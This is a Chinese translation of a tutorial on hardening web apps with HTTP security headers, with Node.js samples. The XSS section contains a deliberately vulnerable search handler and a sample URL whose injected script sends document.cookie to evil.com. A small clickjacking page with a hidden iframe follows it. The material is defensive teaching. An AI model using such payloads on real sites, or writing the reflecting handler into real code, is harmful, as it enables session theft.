> * 原文地址：[How To Secure Your Web App With HTTP Headers](https://www.smashingmagazine.com/2017/04/secure-web-app-http-headers/)
> * 原文作者：[Hagay Lupesko](https://www.smashingmagazine.com/author/hagaylupesko/)
> * 译文出自：[掘金翻译计划](https://github.com/xitu/gold-miner)
> * 译者：[bambooom](https://github.com/bambooom)
> * 校对者：[xunge0613](https://github.com/xunge0613)、[lsvih](https://github.com/lsvih)

## 如何使用 HTTP Headers 来保护你的 Web 应用 ##

众所周知，无论是简单的小网页还是复杂的单页应用，Web 应用都是网络攻击的目标。2016 年，这种最主要的攻击模式 —— 攻击 web 应用，造成了大约 [40% 的数据泄露](http://www.verizonenterprise.com/verizon-insights-lab/dbir/2016/)。事实上，现在来说，了解网络安全并不是锦上添花，而是 **Web 开发者的必需任务**，特别对于构建面向消费者的产品的开发人员。

开发者可以利用 HTTP 响应头来加强 Web 应用程序的安全性，通常只需要添加几行代码即可。本文将介绍 web 开发者如何利用 HTTP Headers 来构建安全的应用。虽然本文的示例代码是 Node.js，但基本所有主流的服务端语言都支持设置 HTTP 响应头，并且都可以简单地对其进行配置。

### 关于 HTTP Headers ###

技术上来说，HTTP 头只是简单的字段，以明文形式编码，它是 HTTP 请求和响应消息头的一部分。它们旨在使客户端和服务端都能够发送和接受有关要建立的连接、所请求的资源，以及返回的资源本身的元数据。

可以简单地使用 cURL `--head` 来检查纯文本 HTTP 响应头，例如：

```sh
$ curl --head https://www.google.com
HTTP/1.1 200 OK
Date: Thu, 05 Jan 2017 08:20:29 GMT
Expires: -1
Cache-Control: private, max-age=0
Content-Type: text/html; charset=ISO-8859-1
Transfer-Encoding: chunked
Accept-Ranges: none
Vary: Accept-Encoding
…
```

现在，数百种响应头正在被 web 应用所使用，其中一部分由[互联网工程任务组（IETF）](https://www.ietf.org/)标准化。IETF 是一个开放性组织，今天我们所熟知的许多 web 标准和专利都是由他们推进的。HTTP 头提供了一种灵活可扩展的机制，造就了现今的网络各种丰富多变的用例。

### 机密资源禁用缓存 ###

缓存是优化客户端-服务端架构性能中有效的技术，HTTP 也不例外，同样广泛利用了缓存技术。但是，在缓存的资源是保密的情况下，缓存可能导致漏洞，所以必须避免。假设一个 web 应用对含有敏感信息的网页进行缓存，并且是在一台公用的 PC 上使用，任何人可以通过访问浏览器的缓存看到这个 web 应用上的敏感信息，甚至有时仅仅通过点击浏览器的返回按钮就可以看到。

IETF [RFC 7234](https://tools.ietf.org/html/rfc7234) 中定义了 HTTP 缓存，指定 HTTP 客户端（浏览器以及网络代理）的默认行为：除非另行指定，否则始终缓存对 HTTP GET 请求的响应。虽然这样可以使 HTTP 提升性能减少网络拥塞，但如上所述，它也有可能使终端用户个人信息被盗。好消息是，HTTP 规范还定义了一种非常简单的方式来指示客户端对特定响应不进行缓存，通过使用 —— 对，你猜到了 —— HTTP 响应头。

当你准备返回敏感信息并希望禁用 HTTP 客户端的缓存时，有三个响应头可以返回：

- `Cache-Control`

从 HTTP 1.1 引入的此响应头可能包含一个或多个指令，每个指令带有特定的缓存语义，指示 HTTP 客户端和代理如何处理有此响应头注释的响应。我推荐如下指定响应头，`cache-control: no-cache, no-store, must-revalidate`。这三个指令基本上可以指示客户端和中间代理不可使用之前缓存的响应，不可存储响应，甚至就算响应被缓存，也必须从源服务器上重新验证。

- `Pragma: no-cache`

为了向后兼容 HTTP 1.0，你还需要包含此响应头。有部分客户端，特别是中间代理，可能仍然没有完全支持 HTTP 1.1，所以不能正确处理前面提到的 `Cache-Control` 响应头，因此使用 `Pragma: no-cache` 确保较旧的客户端不缓存你的响应。

- `Expires: -1`

此响应头指定了该响应过期的时间戳。如果不指定为未来某个真实时间而指定为 `-1`，可以保证客户端立即将此响应视为过期并避免缓存。

需要注意的是，禁用缓存提高安全性及保护机密资源的同时，也的确会带来性能上的折损。所以确保仅对实际需要保密性的资源禁用缓存，而不是对服务器的任何响应禁用。想要更深入了解 web 资源缓存的最佳实践，我推荐阅读 [Jake Archibald 的文章](https://jakearchibald.com/2016/caching-best-practices/)。

下面是 Node.js 中设置响应头的示例代码：

```javascript
function requestHandler(req, res) {
	res.setHeader('Cache-Control','no-cache,no-store,max-age=0,must-revalidate');
	res.setHeader('Pragma','no-cache');
	res.setHeader('Expires','-1');
}
```

### 强制 HTTPS ###

今天，HTTPS 的重要性已经得到了技术界的广泛认可。越来越多的 web 应用配置了安全端点，并将不安全网路重定向到安全端点（即 HTTP 重定向至 HTTPS）。不幸的是，终端用户还未完全理解 HTTPS 的重要性，这种缺乏理解使他们面临着各种中间人攻击（MitM）。普通用户访问到一个 web 应用时，并不会注意到正在使用的网络协议是安全的（HTTPS）还是不安全的（HTTP）。甚至，当浏览器出现了证书错误或警告时，很多用户会直接点击略过警告。

与 web 应用进行交互时，通过有效的 HTTPS 连接是非常重要的：不安全的连接将会使得用户暴露在各种攻击之下，这可能导致 cookie 被盗甚至更糟。举个例子，攻击者可以在公共 Wi-Fi 网络下轻易骗取网络帧并提取那些不使用 HTTPS 的用户的会话 cookie。更糟的情况是，即使用户通过安全连接与 web 应用进行交互也可能遭受降级攻击，这种攻击试图强制将连接降级到不安全的连接，从而使用户受到中间人攻击。

我们如何帮助用户避免这些攻击，并更好地推行 HTTPS 的使用呢？使用 HTTP 严格传输安全头（HSTS）。简单来说，HSTS 确保与源主机间的所有通信都使用 HTTPS。[RFC 6797](https://tools.ietf.org/html/rfc6797) 中说明了，HSTS 可以使 web 应用程序指示浏览器**仅**允许与源主机之间的 HTTPS 连接，将所有不安全的连接内部重定向到安全连接，并自动将所有不安全的资源请求升级为安全请求。

HSTS 的指令如下：

- `max-age=<number of seconds>`

此项指示浏览器对此域缓存此响应头指定的秒数。这样可以保证长时间的加固安全。

- `includeSubDomains`

此项指示浏览器对当前域的所有子域应用 HSTS，这可以用于所有当前和未来可能的子域。

- `preload`

这是一个强大的指令，强制浏览器**始终**安全加载你的 web 应用程序，即使是第一次收到响应之前加载！这是通过将启用 HSTS 预加载域的列表硬编码到浏览器的代码中实现的。要启用预加载功能，你需要在 Google Chrome 团队维护的网站 [HSTS 预加载列表提交](https://hstspreload.org)注册你的域。

注意谨慎使用 `preload`，因为这意味着它不能轻易撤销，并可能更新延迟数个月。虽然预加载肯定会加强应用程序的安全性，但也意味着你需要充分确信你的应用程序仅支持 HTTPS！

我建议的用法是 `Strict-Transport-Security: max-age=31536000; includeSubDomains;`，这样指示了浏览器强制通过 HTTPS 连接到源主机并且有效期为一年。如果你对你的 app 仅处理 HTTPS 很有信心，我也推荐加上 `preload` 指令，当然别忘记去前面提到的预加载列表注册你的网站。

以下是在 Nodes.js 中实现 HSTS 的方法：

```javascript
function requestHandler(req, res){
	res.setHeader('Strict-Transport-Security','max-age=31536000; includeSubDomains; preload');
}
```

### 启用 XSS 过滤 ###

在反射型跨站脚本攻击（reflected XSS）中，攻击者将恶意 JavaScript 代码注入到 HTTP 请求，注入的代码「映射」到响应中，并由浏览器执行，从而使恶意代码在可信任的上下文中执行，访问诸如会话 cookie 中的潜在机密信息。不幸的是，XSS 是一个很常见的网络应用攻击，且令人惊讶地有效！

为了了解反射型 XSS 攻击，参考以下 Node.js 代码，渲染 `mywebapp.com`，模拟一个简单的 web 应用程序，它将搜索结果以及用户请求的搜索关键词一起呈现：

```javascript
function handleRequest(req, res) {
    res.writeHead(200);

    // Get the search term
    const parsedUrl = require('url').parse(req.url);
    const searchTerm = decodeURI(parsedUrl.query);
    const resultSet = search(searchTerm);

    // Render the document
    res.end(
        "<html>" +
            "<body>" +
                "<p>You searched for: " + searchTerm + "</p>" +
                // Search results rendering goes here…
            "</body>" +
        "</html>");
};
```

现在，来考虑一下上面的 web 应用程序会如何处理在 URL 中嵌入的恶意可执行代码，例如：

```
https://mywebapp.com/search?</p><script>window.location=“http://evil.com?cookie=”+document.cookie</script>
```

你可能意识到了，这个 URL 会让浏览器执行注入的脚本，并发送极有可能包含机密会话的用户 cookies 到 evil.com。

为了保护用户抵抗反射型 XSS 攻击，有些浏览器实施了保护机制。这些保护机制尝试通过在 HTTP 请求和响应中寻找匹配的代码模式来辨识这些攻击。Internet Explorer 是第一个推出这种机制的，在 2008 年的 IE 8 中引入了 XSS 过滤器的机制，而 WebKit 后来推出了 XSS 审计，现今在 Chrome 和 Safari 上可用（Firefox 没有内置类似的机制，但是用户可以使用插件来获得此功能）。这些保护机制并不完美，它们可能无法检测到真正的 XSS 攻击（漏报），在其他情况可能会阻止合法代码（误判）。由于后一种情况的出现，浏览器允许用户可设置禁用 XSS 过滤功能。不幸的是，这通常是一个全局设置，这会完全关闭所有浏览器加载的 web 应用程序的安全功能。

幸运的是，有方法可以让 web 应用覆盖此配置，并确保浏览器加载的 web 应用已打开 XSS 过滤器。即通过设定 `X-XSS-Protection` 响应头实现。此响应头支持 Internet Explorer（IE8 以上）、Edge、Chrome 和 Safari，指示浏览器打开或关闭内置的保护机制，及覆盖浏览器的本地配置。

`X-XSS-Protection` 指令包括:

- `1` 或者 `0`

使用或禁用 XSS 过滤器。
- `mode=block`

当检测到 XSS 攻击时，这会指示浏览器不渲染整个页面。

我建议永远打开 XSS 过滤器以及 block 模式，以求最大化保护用户。这样的响应头应该是这样的：

```
X-XSS-Protection: 1; mode=block
```

以下是在 Node.js 中配置此响应头的方法:

```javascript
function requestHandler(req, res){
	res.setHeader('X-XSS-Protection','1;mode=block');}
```

### 控制 iframe ###

iframe （正式来说，是 HTML 内联框架元素）是一个 DOM 元素，它允许一个 web 应用嵌套在另一个 web 应用中。这个强大的元素有部分重要的使用场景，比如在 web 应用中嵌入第三方内容，但它也有重大的缺点，例如对 SEO 不友好，对浏览器导航跳转也不友好等等。

其中一个需要注意的事是它使得点击劫持变得更加容易。点击劫持是一种诱使用户点击并非他们想要点击的目标的攻击。要理解一个简单的劫持实现，参考以下 HTML，当用户认为他们点击可以获得奖品时，实际上是试图欺骗用户购买面包机。

```html
<html>
  <body>
    <button class='some-class'>Win a Prize!</button>
    <iframe class='some-class' style='opacity: 0;’ src='http://buy.com?buy=toaster'></iframe>
  </body>
</html>
```

有许多恶意应用程序都采用了点击劫持，例如诱导用户点赞，在线购买商品，甚至提交机密信息。恶意 web 应用程序可以通过在其恶意应用中嵌入合法的 web 应用来利用 iframe 进行点击劫持，这可以通过设置 `opacity: 0` 的 CSS 规则将其隐藏，并将 iframe 的点击目标直接放置在看起来无辜的按钮之上。点击了这个无害按钮的用户会直接点击在嵌入的 web 应用上，并不知道点击后的后果。

阻止这种攻击的一种有效的方法是限制你的 web 应用被框架化。在 [RFC 7034](https://www.ietf.org/rfc/rfc7034.txt) 中引入的 `X-Frame-Options`，就是设计用来做这件事的。此响应头指示浏览器对你的 web 应用是否可以被嵌入另一个网页进行限制，从而阻止恶意网页欺骗用户调用你的应用程序进行各项操作。你可以使用 `DENY` 完全屏蔽，或者使用 `ALLOW-FROM` 指令将特定域列入白名单，也可以使用 `SAMEORIGIN` 指令将应用的源地址列入白名单。

我的建议是使用 `SAMEORIGIN` 指令，因为它允许 iframe 被同域的应用程序所使用，这有时是有用的。以下是响应头的示例：

```
X-Frame-Options: SAMEORIGIN
```

以下是在 Node.js 中设置此响应头的示例代码：

```javascript
function requestHandler(req, res){
	res.setHeader('X-Frame-Options','SAMEORIGIN');}
```

### 指定白名单资源 ###

如前所述，你可以通过启用浏览器的 XSS 过滤器，给你的 web 应用程序增强安全性。然而请注意，这种机制是有局限性的，不是所有浏览器都支持（例如 Firefox 就不支持 XSS 过滤），并且依赖的模式匹配技术可以被欺骗。

对抗 XSS 和其他攻击的另一层的保护，可以通过明确列出可信来源和操作来实现 —— 这就是内容安全策略（CSP）。

CSP 是一种 W3C 规范，它定义了强大的基于浏览器的安全机制，可以对 web 应用中的资源加载以及脚本执行进行精细的控制。使用 CSP 可以将特定的域加入白名单进行脚本加载、AJAX 调用、图像加载和样式加载等操作。你可以启用或禁用内联脚本或动态脚本（臭名昭著的 `eval`），并通过将特定域列入白名单来控制框架化。CSP 的另一个很酷的功能是它允许配置实时报告目标，以便实时监控应用程序进行 CSP 阻止操作。

这种对资源加载和脚本执行的明确的白名单提供了很强的安全性，在很多情况下都可以防范攻击。例如，使用 CSP 禁止内联脚本，你可以防范很多反射型 XSS 攻击，因为它们依赖于将内联脚本注入到 DOM。

CSP 是一个相对复杂的响应头，它有很多种指令，在这里我不详细展开了，可以参考 HTML5 Rocks 里一篇很棒的[教程](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)，其中提供了 CSP 的概述，我非常推荐阅读它来学习如何在你的 web 应用中使用 CSP。

以下是一个设置 CSP 的示例代码，它仅允许从应用程序的源域加载脚本，并阻止动态脚本的执行（eval）以及内嵌脚本（当然，还是 Node.js):

```javascript
function requestHandler(req, res){
	res.setHeader('Content-Security-Policy',"script-src 'self'");}
```

### 防止 Content-Type 嗅探 ###

为了使用户体验尽可能无缝，许多浏览器实现了一个功能叫内容类型嗅探，或者 MIME 嗅探。这个功能使得浏览器可以通过「嗅探」实际 HTTP 响应的资源的内容直接检测到资源的类型，无视响应头中 `Content-Type` 指定的资源类型。虽然这个功能在某些情况下确实是有用的，它引入了一个漏洞以及一种叫 MIME 类型混淆攻击的攻击手法。MIME 嗅探漏洞使攻击者可以注入恶意资源，例如恶意脚本，伪装成一个无害的资源，例如一张图片。通过 MIME 嗅探，浏览器将忽略声明的图像内容类型，它不会渲染图片，而是执行恶意脚本。

幸运的是，`X-Content-Type-Options` 响应头缓解了这个漏洞。此响应头在 2008 年引入 IE8，目前大多数主流浏览器都支持（Safari 是唯一不支持的主流浏览器），它指示浏览器在处理获取的资源时不使用嗅探。因为 `X-Content-Type-Options` 仅在 [「Fetch」规范](https://fetch.spec.whatwg.org/#x-content-type-options-header)中正式指定，实际的实现因浏览器而异。一部分浏览器（IE 和 Edge）完全阻止了 MIME 嗅探，而其他一些（Firefox）仍然会进行 MIME 嗅探，但会屏蔽掉可执行的资源（JavaScript 和 CSS）如果声明的内容类型与实际的类型不一致。后者符合最新的 Fetch 规范。

`X-Content-Type-Options` 是一个很简单的响应头，它只有一个指令，`nosniff`。它是这样指定的：`X-Content-Type-Options: nosniff`。以下是示例代码：

```javascript
function requestHandler(req, res){
	res.setHeader('X-Content-Type-Options','nosniff');}
```

### 总结 ###

本文中，我们了解了如何利用 HTTP 响应头来加强 web 应用的安全性，防止攻击和减轻漏洞。

#### 要点 ####

- 使用 `Cache-Control` 禁用对机密信息的缓存
- 通过 `Strict-Transport-Security` 强制使用 HTTPS，并将你的域添加到 Chrome 预加载列表
- 利用 `X-XSS-Protection` 使你的 web 应用更加能抵抗 XSS 攻击
- 使用 `X-Frame-Options` 阻止点击劫持
- 利用 `Content-Security-Policy` 将特定来源与端点列入白名单
- 使用 `X-Content-Type-Options` 防止 MIME 嗅探攻击

请记住，为了使 web 真正迷人，它必须是安全的。利用 HTTP 响应头构建更加安全的网页吧！



（**声明：** 此文内容仅属本人，不代表本人过去或现在的雇主。）

（*首页图片版权：[Pexels.com](https://www.pexels.com/photo/coffee-writing-computer-blogging-34600/)*）

---

> [掘金翻译计划](https://github.com/xitu/gold-miner) 是一个翻译优质互联网技术文章的社区，文章来源为 [掘金](https://juejin.im) 上的英文分享文章。内容覆盖 [Android](https://github.com/xitu/gold-miner#android)、[iOS](https://github.com/xitu/gold-miner#ios)、[React](https://github.com/xitu/gold-miner#react)、[前端](https://github.com/xitu/gold-miner#前端)、[后端](https://github.com/xitu/gold-miner#后端)、[产品](https://github.com/xitu/gold-miner#产品)、[设计](https://github.com/xitu/gold-miner#设计) 等领域，想要查看更多优质译文请持续关注 [掘金翻译计划](https://github.com/xitu/gold-miner)。
